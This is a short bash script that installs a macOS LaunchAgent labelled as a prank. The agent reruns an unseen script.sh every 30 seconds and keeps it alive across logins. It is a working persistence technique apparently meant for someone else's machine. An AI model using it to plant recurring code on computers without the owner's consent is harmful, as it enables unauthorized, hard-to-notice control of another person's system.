#!/bin/bash

mv script.sh /usr/local/bin/script.sh

echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
        <string>com.prank.hotdog</string>
        
    <key>ThrottleInterval</key>
        <integer>30</integer>
    
    <key>ProgramArguments</key>
        <array>
                <string>/usr/local/bin/script.sh</string>
        </array>
    
    <key>StartInterval</key>
        <integer>30</integer>
        
    <key>StandardErrorPath</key>
        <string>~/IPerror.err</string>
    
    <key>StandardOutPath</key>
        <string>~/IPoutput.out</string>
    
    <key>KeepAlive</key>
        <true/>
</dict>
</plist>"|cat>script.plist

chmod +x script.plist
mv script.plist ~/Library/LaunchAgents/

launchctl load ~/Library/LaunchAgents/script.plist